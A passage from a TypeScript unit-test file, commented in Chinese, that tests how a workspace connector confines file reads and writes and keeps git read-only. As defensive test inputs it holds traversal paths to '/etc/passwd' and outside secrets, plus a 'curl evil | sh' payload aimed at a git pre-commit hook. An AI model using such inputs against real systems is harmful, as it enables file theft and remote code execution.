/* ---------- 项目面板的执行端（connector/project.ts）：路径约束、读文件、文件树、git 只读 ----------
 * 纯文件系统 + 真 git 的单元测试（不起服务、不连库）。重点是安全：
 *   - 路径约束：`../`、绝对路径、NUL、指向 root 外的符号链接（目录 / 文件）、`/a/bc` 不算在 `/a/b` 之下、
 *     root 本身是符号链接时以 realpath 为准、目标不存在，tree / read / git-diff 三种帧一律拒绝；
 *   - 二进制拒绝、超大文件截断、管道 / 目录不当文件读；
 *   - write（唯一会改磁盘的帧）：同一套路径约束，只改已存在的普通 UTF-8 文本文件，1MB、NUL、baseHash、.git、只读、原子写保留权限位；
 *   - git 只读，不会执行仓库配置里的外部程序（diff.external / textconv / core.fsmonitor）：先用同样的配置直接跑一遍 git，
 *     证明陷阱是活的（标记文件真的会被写出来），再证明项目面板的调用不会写出它。 */
import { createHash } from 'node:crypto'
import { execFileSync } from 'node:child_process'
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { beforeEach, describe, expect, test } from 'vitest'
import type { ProjectMsg } from '../agents/protocol.js'
import { FILES_MAX, READ_MAX_BYTES, TREE_MAX_ENTRIES, type ProjectReply } from '../agents/project-types.js'
import { handleProject, PathDenied, WriteConflict } from './project.js'

const win = process.platform === 'win32'

/** 每个测试一个干净的沙盒：work/（工作区）、outside/（root 之外，放不该被读到的东西）、sibling 同前缀目录 */
let box: string
let work: string
let outside: string

beforeEach(() => {
  box = realpathSync(mkdtempSync(join(tmpdir(), 'ramet-proj-')))
  work = join(box, 'work')
  outside = join(box, 'outside')
  mkdirSync(work)
  mkdirSync(outside)
  writeFileSync(join(outside, 'secret.txt'), 'TOP SECRET')
})

/** 帧里除 rid / actor 之外的部分（对 ProjectMsg 的每个成员分别去掉，保留判别字段） */
type Frame = ProjectMsg extends infer M ? (M extends ProjectMsg ? Omit<M, 'rid' | 'actor'> : never) : never

const ask = (msg: Frame, protect: string[] = []): Promise<ProjectReply> =>
  handleProject({ rid: 'r', actor: 'u', ...msg } as ProjectMsg, { protect })

const tree = (path = '', root = work) => ask({ t: 'tree', root, path }) as Promise<Extract<ProjectReply, { op: 'tree' }>>
const read = (path: string, root = work) => ask({ t: 'read', root, path }) as Promise<Extract<ProjectReply, { op: 'read' }>>
const status = (root = work) => ask({ t: 'git-status', root }) as Promise<Extract<ProjectReply, { op: 'git-status' }>>
const diff = (path?: string, root = work) =>
  ask({ t: 'git-diff', root, ...(path ? { path } : {}) }) as Promise<Extract<ProjectReply, { op: 'git-diff' }>>
const files = (root = work) => ask({ t: 'files', root }) as Promise<Extract<ProjectReply, { op: 'files' }>>

const GIT_ENV = {
  ...process.env,
  GIT_AUTHOR_NAME: 't',
  GIT_AUTHOR_EMAIL: 't@t',
  GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@t',
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_SYSTEM: '/dev/null',
}
function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', ['-c', 'commit.gpgsign=false', ...args], { cwd, env: GIT_ENV, encoding: 'utf8' })
}
function initRepo(dir = work): void {
  git(dir, 'init', '-q', '-b', 'main')
}
function commitAll(dir = work, msg = 'c'): void {
  git(dir, 'add', '-A')
  git(dir, 'commit', '-q', '-m', msg)
}

describe.skipIf(win)('路径约束（tree / read / git-diff 一律同一套）', () => {
  const FRAMES = ['tree', 'read', 'git-diff'] as const
  const probe = (kind: (typeof FRAMES)[number], path: string, root = work): Promise<ProjectReply> =>
    ask(kind === 'tree' ? { t: 'tree', root, path } : kind === 'read' ? { t: 'read', root, path } : { t: 'git-diff', root, path })

  test('`..` 越出 root：路径里带 .. 的一律拒绝（哪怕落点真实存在）', async () => {
    for (const kind of FRAMES) {
      for (const path of ['..', '../outside', '../outside/secret.txt', 'a/../../outside/secret.txt', 'sub/../..']) {
        await expect(probe(kind, path), `${kind} ${path}`).rejects.toBeInstanceOf(PathDenied)
      }
    }
  })

  test('绝对路径与 NUL 字节、非字符串一律拒绝', async () => {
    for (const kind of FRAMES) {
      for (const path of [join(outside, 'secret.txt'), '/etc/passwd', '/', '\\windows\\system32', 'a\0b']) {
        await expect(probe(kind, path), `${kind} ${JSON.stringify(path)}`).rejects.toBeInstanceOf(PathDenied)
      }
      await expect(probe(kind, 42 as unknown as string)).rejects.toBeInstanceOf(PathDenied)
    }
    // root 自己也要形状合法：相对路径 / 含 NUL / 不存在 / 是文件都不行
    writeFileSync(join(work, 'f.txt'), 'x')
    for (const root of ['work', '', `${work}\0`, join(box, 'nope'), join(work, 'f.txt')]) {
      await expect(tree('', root), JSON.stringify(root)).rejects.toBeInstanceOf(PathDenied)
    }
  })

  test('指向 root 外的符号链接（目录 / 文件 / 链到链）拒绝；目标不存在拒绝', async () => {
    symlinkSync(outside, join(work, 'out-dir'))
    symlinkSync(join(outside, 'secret.txt'), join(work, 'out-file'))
    symlinkSync(join(work, 'out-dir'), join(work, 'link-to-link'))
    for (const kind of FRAMES) {
      for (const path of ['out-dir', 'out-dir/secret.txt', 'out-file', 'link-to-link', 'link-to-link/secret.txt', 'missing', 'out-dir/nope']) {
        await expect(probe(kind, path), `${kind} ${path}`).rejects.toBeInstanceOf(PathDenied)
      }
    }
  })

  test('前缀陷阱：/a/bc 不在 /a/b 之下（同前缀的兄弟目录经符号链接也进不去）', async () => {
    const sibling = join(box, 'work-evil')
    mkdirSync(sibling)
    writeFileSync(join(sibling, 'x.txt'), 'evil')
    symlinkSync(sibling, join(work, 'sib'))
    for (const kind of FRAMES) {
      await expect(probe(kind, 'sib'), kind).rejects.toBeInstanceOf(PathDenied)
      await expect(probe(kind, 'sib/x.txt'), kind).rejects.toBeInstanceOf(PathDenied)
    }
  })

  test('root 本身是指向别处的符号链接：以 realpath 为准，链接之外仍不能碰', async () => {
    const real = join(box, 'real-ws')
    mkdirSync(real)
    writeFileSync(join(real, 'in.txt'), 'in')
    symlinkSync(real, join(box, 'ws-link'))
    const viaLink = join(box, 'ws-link')
    expect((await read('in.txt', viaLink)).text).toBe('in')
    expect((await tree('', viaLink)).entries.map((e) => e.name)).toEqual(['in.txt'])
    // root 的真实位置是 real-ws：../outside 之类仍然是越界
    await expect(read('../outside/secret.txt', viaLink)).rejects.toBeInstanceOf(PathDenied)
    // 链接指向 root 里的东西、root 之外的链接：以 real-ws 为界
    symlinkSync(outside, join(real, 'out'))
    await expect(read('out/secret.txt', viaLink)).rejects.toBeInstanceOf(PathDenied)
  })

  test('指向 root 之内的符号链接可以用（树里标 link，内容可读）', async () => {
    mkdirSync(join(work, 'real'))
    writeFileSync(join(work, 'real', 'a.txt'), 'AAA')
    symlinkSync(join(work, 'real'), join(work, 'alias'))
    symlinkSync(join(work, 'real', 'a.txt'), join(work, 'a-link.txt'))
    expect((await read('alias/a.txt')).text).toBe('AAA')
    expect((await read('a-link.txt')).text).toBe('AAA')
    const names = Object.fromEntries((await tree()).entries.map((e) => [e.name, e]))
    expect(names.alias).toMatchObject({ type: 'dir', link: true })
    expect(names['a-link.txt']).toMatchObject({ type: 'file', link: true, size: 3 })
  })

  test('树里：指向 root 外的链接与悬空链接标成 link（不可展开 / 打开），不泄露目标', async () => {
    symlinkSync(outside, join(work, 'out-dir'))
    symlinkSync(join(box, 'gone'), join(work, 'dangling'))
    const entries = Object.fromEntries((await tree()).entries.map((e) => [e.name, e]))
    expect(entries['out-dir']).toEqual({ name: 'out-dir', type: 'link' })
    expect(entries.dangling).toEqual({ name: 'dangling', type: 'link' })
  })

  test('protect：connector 自己的配置目录不对网页开放（哪怕工作区把它圈了进去）', async () => {
    const cfg = join(work, '.ramet')
    mkdirSync(cfg)
    writeFileSync(join(cfg, 'connector.json'), '{"token":"SECRET-TOKEN"}')
    for (const kind of FRAMES) {
      await expect(ask({ t: kind, root: work, path: '.ramet' } as ProjectMsg, [cfg]), kind).rejects.toBeInstanceOf(PathDenied)
    }
    await expect(ask({ t: 'read', root: work, path: '.ramet/connector.json' }, [cfg])).rejects.toBeInstanceOf(PathDenied)
    // 以链接绕进去也一样（realpath 之后再比）
    symlinkSync(cfg, join(work, 'sneak'))
    await expect(ask({ t: 'read', root: work, path: 'sneak/connector.json' }, [cfg])).rejects.toBeInstanceOf(PathDenied)
    // root 就是配置目录：拒绝；父目录当 root 时别的文件照常可读
    await expect(ask({ t: 'tree', root: cfg, path: '' }, [cfg])).rejects.toBeInstanceOf(PathDenied)
    await expect(ask({ t: 'files', root: cfg }, [cfg])).rejects.toBeInstanceOf(PathDenied)
    writeFileSync(join(work, 'ok.txt'), 'ok')
    expect(((await ask({ t: 'read', root: work, path: 'ok.txt' }, [cfg])) as { text: string }).text).toBe('ok')
    // 树里把指向配置目录的链接标成 link
    const entries = Object.fromEntries(((await ask({ t: 'tree', root: work, path: '' }, [cfg])) as { entries: Array<{ name: string; type: string }> }).entries.map((e) => [e.name, e.type]))
    expect(entries.sneak).toBe('link')
  })
})

describe('read', () => {
  test('文本：原样给回，附带大小；子目录路径用 / 分隔', async () => {
    mkdirSync(join(work, 'src'))
    writeFileSync(join(work, 'src', 'a.ts'), 'const x = 1\n中文\n')
    const res = await read('src/a.ts')
    expect(res).toMatchObject({ op: 'read', path: 'src/a.ts', binary: false, truncated: false, text: 'const x = 1\n中文\n' })
    expect(res.size).toBe(Buffer.byteLength('const x = 1\n中文\n'))
  })

  test('二进制（含 NUL）拒绝显示：不回内容', async () => {
    writeFileSync(join(work, 'blob.bin'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 1, 2, 3]))
    expect(await read('blob.bin')).toMatchObject({ binary: true, text: '', size: 8, truncated: false })
  })

  test('超大文件：只给前 READ_MAX_BYTES 并标 truncated；截断点切在多字节字符中间也不出乱码', async () => {
    // "中" = 3 字节。让 1MiB 边界落在一个字符的第二个字节上
    const text = 'a' + '中'.repeat(Math.ceil(READ_MAX_BYTES / 3) + 10)
    writeFileSync(join(work, 'big.txt'), text)
    const res = await read('big.txt')
    expect(res.truncated).toBe(true)
    expect(res.size).toBe(Buffer.byteLength(text))
    expect(res.text).not.toContain('�')
    expect(Buffer.byteLength(res.text)).toBeLessThanOrEqual(READ_MAX_BYTES)
    expect(Buffer.byteLength(res.text)).toBeGreaterThan(READ_MAX_BYTES - 4)
    // 恰好等于上限不算截断
    writeFileSync(join(work, 'exact.txt'), 'x'.repeat(READ_MAX_BYTES))
    expect((await read('exact.txt')).truncated).toBe(false)
  })

  test('目录当文件读 / 不存在：给人话，不读', async () => {
    mkdirSync(join(work, 'd'))
    await expect(read('d')).rejects.toThrow('不是普通文件')
    await expect(read('nope.txt')).rejects.toThrow('路径不存在')
  })

  test.skipIf(win)('管道不会被当文件读（open 不阻塞）', async () => {
    try {
      execFileSync('mkfifo', [join(work, 'pipe')])
    } catch {
      return // 本机没有 mkfifo
    }
    await expect(read('pipe')).rejects.toBeInstanceOf(PathDenied)
  })
})

describe('tree', () => {
  test('一层目录：目录在前、按名排序，带大小；不列 .git；不是目录的路径拒绝', async () => {
    mkdirSync(join(work, 'zeta'))
    mkdirSync(join(work, 'alpha'))
    mkdirSync(join(work, '.git'))
    writeFileSync(join(work, 'b.txt'), 'bb')
    writeFileSync(join(work, 'a.txt'), 'a')
    const res = await tree()
    expect(res.path).toBe('')
    expect(res.entries).toEqual([
      { name: 'alpha', type: 'dir' },
      { name: 'zeta', type: 'dir' },
      { name: 'a.txt', type: 'file', size: 1 },
      { name: 'b.txt', type: 'file', size: 2 },
    ])
    await expect(tree('a.txt')).rejects.toThrow('不是目录')
    expect((await tree('alpha')).path).toBe('alpha')
  })

  test('单目录条数封顶并标 truncated', async () => {
    mkdirSync(join(work, 'many'))
    for (let i = 0; i < TREE_MAX_ENTRIES + 5; i++) writeFileSync(join(work, 'many', `f${String(i).padStart(5, '0')}`), '')
    const res = await tree('many')
    expect(res.entries).toHaveLength(TREE_MAX_ENTRIES)
    expect(res.truncated).toBe(true)
  })

  test('git 状态标记：文件 M / A / D / R / ?，目录里有改动就标 M（全是未跟踪标 ?）', async () => {
    initRepo()
    mkdirSync(join(work, 'src'))
    mkdirSync(join(work, 'docs'))
    writeFileSync(join(work, 'src', 'a.ts'), '1\n')
    writeFileSync(join(work, 'src', 'gone.ts'), 'g\n')
    writeFileSync(join(work, 'src', 'old-name.ts'), 'rename me please, this is long enough to be detected as a rename\n')
    writeFileSync(join(work, 'docs', 'keep.md'), 'k\n')
    commitAll()
    writeFileSync(join(work, 'src', 'a.ts'), '2\n') // M
    execFileSync('rm', [join(work, 'src', 'gone.ts')]) // D
    git(work, 'mv', 'src/old-name.ts', 'src/new-name.ts') // R
    writeFileSync(join(work, 'src', 'staged.ts'), 's\n')
    git(work, 'add', 'src/staged.ts') // A
    mkdirSync(join(work, 'fresh'))
    writeFileSync(join(work, 'fresh', 'x.ts'), 'x\n') // ?（整个目录都是未跟踪）
    const root = Object.fromEntries((await tree()).entries.map((e) => [e.name, e.git]))
    expect(root).toMatchObject({ src: 'M', fresh: '?' })
    expect(root.docs).toBeUndefined()
    const src = Object.fromEntries((await tree('src')).entries.map((e) => [e.name, e.git]))
    expect(src).toMatchObject({ 'a.ts': 'M', 'new-name.ts': 'R', 'staged.ts': 'A' })
    expect('gone.ts' in src).toBe(false) // 已删除的文件磁盘上没有，树里不画
    expect((await tree('fresh')).entries[0]).toMatchObject({ name: 'x.ts', git: '?' })
  })
})

describe('files', () => {
  test('git 仓库：已跟踪 + 未跟踪但没被忽略的；被 .gitignore 的不在', async () => {
    initRepo()
    mkdirSync(join(work, 'src'))
    writeFileSync(join(work, '.gitignore'), 'ignored.log\nbuild/\n')
    writeFileSync(join(work, 'src', 'a.ts'), 'a')
    writeFileSync(join(work, 'ignored.log'), 'x')
    mkdirSync(join(work, 'build'))
    writeFileSync(join(work, 'build', 'out.js'), 'x')
    commitAll()
    writeFileSync(join(work, 'src', 'new.ts'), 'n')
    const res = await files()
    expect(res.truncated).toBe(false)
    expect([...res.files].sort()).toEqual(['.gitignore', 'src/a.ts', 'src/new.ts'])
  })

  test('非 git 目录：遍历（跳过 node_modules / .git / 隐藏的依赖目录），不跟符号链接', async () => {
    mkdirSync(join(work, 'src'))
    mkdirSync(join(work, 'node_modules', 'dep'), { recursive: true })
    mkdirSync(join(work, '.git'))
    writeFileSync(join(work, 'src', 'a.ts'), 'a')
    writeFileSync(join(work, 'README.md'), 'r')
    writeFileSync(join(work, 'node_modules', 'dep', 'index.js'), 'x')
    writeFileSync(join(work, '.git', 'HEAD'), 'x')
    if (!win) symlinkSync(outside, join(work, 'out-dir'))
    const res = await files()
    expect([...res.files].sort()).toEqual(['README.md', 'src/a.ts'])
  })
})

describe('files 上限', () => {
  test('非 git 目录：超过 FILES_MAX 截断并标 truncated', async () => {
    for (let d = 0; d < 21; d++) {
      mkdirSync(join(work, `d${d}`))
      for (let i = 0; i < 1000; i++) writeFileSync(join(work, `d${d}`, `f${i}`), '')
    }
    const res = await files()
    expect(res.files).toHaveLength(FILES_MAX)
    expect(res.truncated).toBe(true)
  })

  test('git 仓库：同样封顶', async () => {
    initRepo()
    for (let d = 0; d < 21; d++) {
      mkdirSync(join(work, `d${d}`))
      for (let i = 0; i < 1000; i++) writeFileSync(join(work, `d${d}`, `f${i}`), '')
    }
    const res = await files()
    expect(res.files).toHaveLength(FILES_MAX)
    expect(res.truncated).toBe(true)
  })
})

describe('git-status', () => {
  test('不是仓库：repo false，没有文件', async () => {
    writeFileSync(join(work, 'a.txt'), 'a')
    expect(await status()).toEqual({ op: 'git-status', repo: false, branch: null, files: [], truncated: false })
  })

  test('分支、未提交改动（未跟踪的目录展开成文件）、暂存标记、重命名来源', async () => {
    initRepo()
    writeFileSync(join(work, 'a.txt'), 'a long enough line so that git detects the rename later on\n')
    writeFileSync(join(work, 'b.txt'), 'b\n')
    commitAll()
    expect(await status()).toMatchObject({ repo: true, branch: 'main', files: [], truncated: false })
    writeFileSync(join(work, 'b.txt'), 'b2\n')
    git(work, 'mv', 'a.txt', 'a2.txt')
    mkdirSync(join(work, 'new'))
    writeFileSync(join(work, 'new', 'x.txt'), 'x')
    writeFileSync(join(work, 'new', 'y.txt'), 'y')
    const res = await status()
    expect(res.branch).toBe('main')
    const byPath = Object.fromEntries(res.files.map((f) => [f.path, f]))
    expect(byPath['b.txt']).toMatchObject({ mark: 'M', staged: false })
    expect(byPath['a2.txt']).toMatchObject({ mark: 'R', staged: true, from: 'a.txt' })
    expect(byPath['new/x.txt']).toMatchObject({ mark: '?', staged: false })
    expect(byPath['new/y.txt']).toMatchObject({ mark: '?' })
    expect(byPath['new']).toBeUndefined()
  })

  test('工作区是仓库的子目录：只看子目录，路径相对子目录（porcelain 原本相对仓库顶层）', async () => {
    initRepo()
    mkdirSync(join(work, 'pkg'))
    writeFileSync(join(work, 'top.txt'), 't\n')
    writeFileSync(join(work, 'pkg', 'in.txt'), 'i\n')
    commitAll()
    writeFileSync(join(work, 'top.txt'), 't2\n')
    writeFileSync(join(work, 'pkg', 'in.txt'), 'i2\n')
    const res = await status(join(work, 'pkg'))
    expect(res.files.map((f) => f.path)).toEqual(['in.txt'])
    expect((await tree('', join(work, 'pkg'))).entries[0]).toMatchObject({ name: 'in.txt', git: 'M' })
    expect((await diff('in.txt', join(work, 'pkg'))).diff).toContain('+i2')
  })

  test('还没有提交的新仓库 / 游离 HEAD', async () => {
    initRepo()
    writeFileSync(join(work, 'a.txt'), 'a\n')
    expect(await status()).toMatchObject({ repo: true, branch: 'main', files: [{ path: 'a.txt', mark: '?' }] })
    commitAll()
    git(work, 'checkout', '-q', '--detach')
    expect(await status()).toMatchObject({ repo: true, branch: null, detached: true })
  })

  test('ahead / behind', async () => {
    const bare = join(box, 'remote.git')
    mkdirSync(bare)
    git(bare, 'init', '-q', '--bare', '-b', 'main')
    initRepo()
    git(work, 'remote', 'add', 'origin', bare)
    writeFileSync(join(work, 'a.txt'), 'a\n')
    commitAll(work, 'one')
    git(work, 'push', '-q', '-u', 'origin', 'main')
    writeFileSync(join(work, 'b.txt'), 'b\n')
    commitAll(work, 'two')
    expect(await status()).toMatchObject({ branch: 'main', ahead: 1 })
  })
})

describe('git-diff', () => {
  test('单文件：已跟踪的改动（暂存 + 未暂存都算）、未跟踪文件现算、没改动是空', async () => {
    initRepo()
    writeFileSync(join(work, 'a.txt'), 'one\ntwo\n')
    writeFileSync(join(work, 'b.txt'), 'bee\n')
    commitAll()
    writeFileSync(join(work, 'a.txt'), 'one\nTWO\n')
    writeFileSync(join(work, 'b.txt'), 'bee2\n')
    git(work, 'add', 'b.txt') // 已暂存
    writeFileSync(join(work, 'c.txt'), 'brand new\n')
    const a = await diff('a.txt')
    expect(a.diff).toContain('-two')
    expect(a.diff).toContain('+TWO')
    expect((await diff('b.txt')).diff).toContain('+bee2')
    const c = await diff('c.txt')
    expect(c.diff).toContain('+brand new')
    expect(c.diff).toContain('new file')
    expect((await diff('c.txt')).path).toBe('c.txt')
    // 全部（已跟踪的）
    const all = await diff()
    expect(all.diff).toContain('+TWO')
    expect(all.diff).toContain('+bee2')
    expect(all.diff).not.toContain('brand new')
    expect(all.truncated).toBe(false)
  })

  test('新仓库（还没有 HEAD）：暂存 + 未暂存两份拼在一起', async () => {
    initRepo()
    writeFileSync(join(work, 'a.txt'), 'staged\n')
    git(work, 'add', 'a.txt')
    writeFileSync(join(work, 'a.txt'), 'staged\nand more\n')
    const res = await diff('a.txt')
    expect(res.diff).toContain('+staged')
    expect(res.diff).toContain('+and more')
  })

  test('非仓库：空 diff，不报错', async () => {
    writeFileSync(join(work, 'a.txt'), 'a')
    expect(await diff('a.txt')).toMatchObject({ diff: '', truncated: false })
  })

  test('超大 diff 截断并标 truncated', async () => {
    initRepo()
    writeFileSync(join(work, 'big.txt'), 'x\n')
    commitAll()
    writeFileSync(join(work, 'big.txt'), 'line of text to make the diff large enough\n'.repeat(40_000))
    const res = await diff('big.txt')
    expect(res.truncated).toBe(true)
    expect(res.diff.length).toBeLessThanOrEqual(1024 * 1024)
  })
})

describe.skipIf(win)('git 只读：仓库配置里的外部程序（diff.external / textconv / fsmonitor）不会被执行', () => {
  /** 一个会留下标记文件的脚本 */
  function trap(name: string): { script: string; marker: string } {
    const script = join(box, `${name}.sh`)
    const marker = join(box, `${name}.ran`)
    writeFileSync(script, `#!/bin/sh\ntouch "${marker}"\nexit 0\n`)
    chmodSync(script, 0o755)
    return { script, marker }
  }

  test('陷阱是活的（直接跑 git 会触发），而项目面板的全部调用都不会触发', async () => {
    initRepo()
    const ext = trap('ext')
    const conv = trap('conv')
    const mon = trap('mon')
    writeFileSync(join(work, 'a.txt'), 'one\n')
    writeFileSync(join(work, '.gitattributes'), '*.txt diff=custom\n')
    commitAll()
    git(work, 'config', 'diff.custom.textconv', conv.script)
    git(work, 'config', 'core.fsmonitor', mon.script)
    writeFileSync(join(work, 'a.txt'), 'two\n')

    // 1) 证明陷阱有效：不带防护的 git 调用会执行它们（否则下面的「没执行」什么也说明不了）。
    //    diff.external 会盖过 textconv，所以分两步触发
    git(work, 'diff', '--textconv', 'HEAD')
    git(work, 'status', '--porcelain')
    git(work, 'config', 'diff.external', ext.script)
    git(work, 'diff', '--ext-diff', 'HEAD')
    expect(existsSync(ext.marker), 'diff.external 应被直接调用触发').toBe(true)
    expect(existsSync(conv.marker), 'textconv 应被直接调用触发').toBe(true)
    expect(existsSync(mon.marker), 'core.fsmonitor 应被直接调用触发').toBe(true)
    for (const m of [ext, conv, mon]) execFileSync('rm', [m.marker])

    // 2) 项目面板的每一种帧都跑一遍：标记文件一个都不许出现
    await status()
    await tree()
    await files()
    await diff('a.txt')
    await diff()
    writeFileSync(join(work, 'untracked.txt'), 'u\n')
    await diff('untracked.txt')
    await status()
    expect(existsSync(ext.marker), 'diff.external 不该被执行').toBe(false)
    expect(existsSync(conv.marker), 'textconv 不该被执行').toBe(false)
    expect(existsSync(mon.marker), 'core.fsmonitor 不该被执行').toBe(false)
  })

  test('继承来的环境变量 GIT_EXTERNAL_DIFF / GIT_DIR 也不起作用', async () => {
    initRepo()
    const ext = trap('envext')
    writeFileSync(join(work, 'a.txt'), 'one\n')
    commitAll()
    writeFileSync(join(work, 'a.txt'), 'two\n')
    const elsewhere = join(box, 'elsewhere')
    mkdirSync(elsewhere)
    git(elsewhere, 'init', '-q', '-b', 'other')
    process.env.GIT_EXTERNAL_DIFF = ext.script
    process.env.GIT_DIR = join(elsewhere, '.git')
    try {
      const res = await diff('a.txt')
      expect(res.diff).toContain('+two') // 看的是 work 这个仓库，不是 GIT_DIR 指的那个
      expect((await status()).branch).toBe('main')
    } finally {
      delete process.env.GIT_EXTERNAL_DIFF
      delete process.env.GIT_DIR
    }
    expect(existsSync(ext.marker)).toBe(false)
  })

  test('只读：调用前后仓库的索引与提交都没变', async () => {
    initRepo()
    writeFileSync(join(work, 'a.txt'), 'one\n')
    commitAll()
    writeFileSync(join(work, 'a.txt'), 'two\n')
    writeFileSync(join(work, 'u.txt'), 'u\n')
    const snapshot = (): string => git(work, 'status', '--porcelain=v1') + git(work, 'rev-parse', 'HEAD') + git(work, 'stash', 'list')
    const before = snapshot()
    await status()
    await diff()
    await diff('u.txt')
    await files()
    await tree()
    expect(snapshot()).toBe(before)
  })
})

const sha = (data: string | Buffer): string => createHash('sha256').update(data).digest('hex')
const put = (rel: string, content: string | Buffer): string => {
  writeFileSync(join(work, rel), content)
  return sha(content)
}
const write = (path: string, content: string, baseHash: string, protect: string[] = [], root = work) =>
  ask({ t: 'write', root, path, baseHash, content }, protect) as Promise<Extract<ProjectReply, { op: 'write' }>>
const text = (path: string): string => readFileSync(path, 'utf8')

describe.skipIf(win)('write', () => {
  test('读到的 hash 就是写回时要带的版本：写成功后内容变了、返回新 hash（= 再读到的 hash）、不留临时文件', async () => {
    mkdirSync(join(work, 'src'))
    const base = put('src/a.ts', 'const a = 1\n')
    const got = await read('src/a.ts')
    expect(got.hash).toBe(base)
    const done = await write('src/a.ts', 'const a = 2\n中文\n', base)
    expect(done).toEqual({ op: 'write', path: 'src/a.ts', hash: sha('const a = 2\n中文\n') })
    expect(text(join(work, 'src/a.ts'))).toBe('const a = 2\n中文\n')
    expect((await read('src/a.ts')).hash).toBe(done.hash)
    expect(readdirSync(join(work, 'src'))).toEqual(['a.ts'])
    // 连着改：用上一次返回的 hash 当 baseHash
    await write('src/a.ts', 'x\n', done.hash)
    expect(text(join(work, 'src/a.ts'))).toBe('x\n')
  })

  test('baseHash 不符（读到之后文件被改过）：WriteConflict，文件一个字节都不动', async () => {
    const base = put('a.txt', 'v1')
    writeFileSync(join(work, 'a.txt'), 'v2-by-someone-else')
    await expect(write('a.txt', 'mine', base)).rejects.toBeInstanceOf(WriteConflict)
    await expect(write('a.txt', 'mine', base)).rejects.toThrow('文件已被改动，请重新打开')
    expect(text(join(work, 'a.txt'))).toBe('v2-by-someone-else')
    // 乱写的 hash：形状不对也拒绝，且不是 conflict（是参数问题）
    for (const bad of ['', 'abc', 'Z'.repeat(64), sha('v2-by-someone-else').toUpperCase()]) {
      const err = await write('a.txt', 'mine', bad).catch((e: unknown) => e)
      expect(err, bad).toBeInstanceOf(PathDenied)
      expect(err, bad).not.toBeInstanceOf(WriteConflict)
    }
    expect(text(join(work, 'a.txt'))).toBe('v2-by-someone-else')
  })

  test('保留权限位（chmod 0o640 写完还是 0o640）；原子写：同目录临时文件 rename，内容整份换', async () => {
    const base = put('script.sh', 'echo 1\n')
    chmodSync(join(work, 'script.sh'), 0o640)
    await write('script.sh', 'echo 2\n', base)
    expect(statSync(join(work, 'script.sh')).mode & 0o7777).toBe(0o640)
    const exec = put('run.sh', '#!/bin/sh\n')
    chmodSync(join(work, 'run.sh'), 0o755)
    await write('run.sh', '#!/bin/sh\necho hi\n', exec)
    expect(statSync(join(work, 'run.sh')).mode & 0o7777).toBe(0o755)
    expect(readdirSync(work).filter((n) => n.includes('.tmp'))).toEqual([])
  })

  test('路径约束同 read：.. / 绝对路径 / NUL / 指向 root 外的符号链接 / 目录 / root 本身 / 不存在（不会新建文件）都拒绝，root 外的文件不被碰', async () => {
    const outsideHash = sha('TOP SECRET')
    const base = put('a.txt', 'a')
    symlinkSync(join(outside, 'secret.txt'), join(work, 'out-link'))
    symlinkSync(outside, join(work, 'out-dir'))
    mkdirSync(join(work, 'dir'))
    for (const path of ['../outside/secret.txt', '/etc/passwd', join(outside, 'secret.txt'), 'a.txt\0', 'out-link', 'out-dir/secret.txt', 'dir', '', '.', 'nope.txt', 'sub/new.txt']) {
      await expect(write(path, 'PWNED', path === 'a.txt\0' ? base : outsideHash), JSON.stringify(path)).rejects.toBeInstanceOf(PathDenied)
    }
    expect(text(join(outside, 'secret.txt'))).toBe('TOP SECRET')
    expect(existsSync(join(work, 'nope.txt'))).toBe(false)
    expect(existsSync(join(work, 'sub'))).toBe(false)
    expect(readdirSync(outside)).toEqual(['secret.txt'])
    // 非字符串的 path / content
    await expect(ask({ t: 'write', root: work, path: 5 as unknown as string, baseHash: base, content: 'x' })).rejects.toBeInstanceOf(PathDenied)
    await expect(ask({ t: 'write', root: work, path: 'a.txt', baseHash: base, content: 5 as unknown as string })).rejects.toBeInstanceOf(PathDenied)
    expect(text(join(work, 'a.txt'))).toBe('a')
  })

  test('符号链接指向 root 之内的文件：写的是目标，链接还是链接', async () => {
    const base = put('real.txt', 'before')
    symlinkSync(join(work, 'real.txt'), join(work, 'link.txt'))
    const done = await write('link.txt', 'after', base)
    expect(done.path).toBe('real.txt') // 实际写到的文件（符号链接解开后）
    expect(lstatSync(join(work, 'link.txt')).isSymbolicLink()).toBe(true)
    expect(text(join(work, 'real.txt'))).toBe('after')
    expect(text(join(work, 'link.txt'))).toBe('after')
  })

  test('protect：connector 自己的配置目录写不了（直接 / 经链接），.git 里面也写不了', async () => {
    const cfg = join(work, '.ramet')
    mkdirSync(cfg)
    const secret = '{"token":"SECRET-TOKEN"}'
    writeFileSync(join(cfg, 'connector.json'), secret)
    await expect(write('.ramet/connector.json', '{}', sha(secret), [cfg])).rejects.toBeInstanceOf(PathDenied)
    symlinkSync(cfg, join(work, 'sneak'))
    await expect(write('sneak/connector.json', '{}', sha(secret), [cfg])).rejects.toBeInstanceOf(PathDenied)
    expect(text(join(cfg, 'connector.json'))).toBe(secret)
    // .git：hooks / config 改了会在主人下次提交时执行东西
    initRepo()
    const hook = '#!/bin/sh\nexit 0\n'
    writeFileSync(join(work, '.git', 'hooks', 'pre-commit'), hook)
    await expect(write('.git/hooks/pre-commit', 'curl evil | sh', sha(hook))).rejects.toThrow('.git')
    await expect(write('.git/config', 'x', sha(text(join(work, '.git', 'config'))))).rejects.toThrow('.git')
    expect(text(join(work, '.git', 'hooks', 'pre-commit'))).toBe(hook)
  })

  test('只改普通文件：管道拒绝（open 不阻塞）', async () => {
    try {
      execFileSync('mkfifo', [join(work, 'pipe')])
    } catch {
      return // 本机没有 mkfifo
    }
    await expect(write('pipe', 'x', sha(''))).rejects.toBeInstanceOf(PathDenied)
  })

  test('体积与内容：新内容 > 1MB / 含 NUL 拒绝；原文件 > 1MB（读时被截断过）/ 二进制 / 不是 UTF-8 / 只读都不让写', async () => {
    const base = put('a.txt', 'small')
    await expect(write('a.txt', 'x'.repeat(READ_MAX_BYTES + 1), base)).rejects.toThrow('1MB')
    await write('a.txt', 'y'.repeat(READ_MAX_BYTES), base) // 恰好 1MB 可以
    expect(statSync(join(work, 'a.txt')).size).toBe(READ_MAX_BYTES)
    const base2 = sha('y'.repeat(READ_MAX_BYTES))
    await expect(write('a.txt', 'a\0b', base2)).rejects.toThrow('NUL')
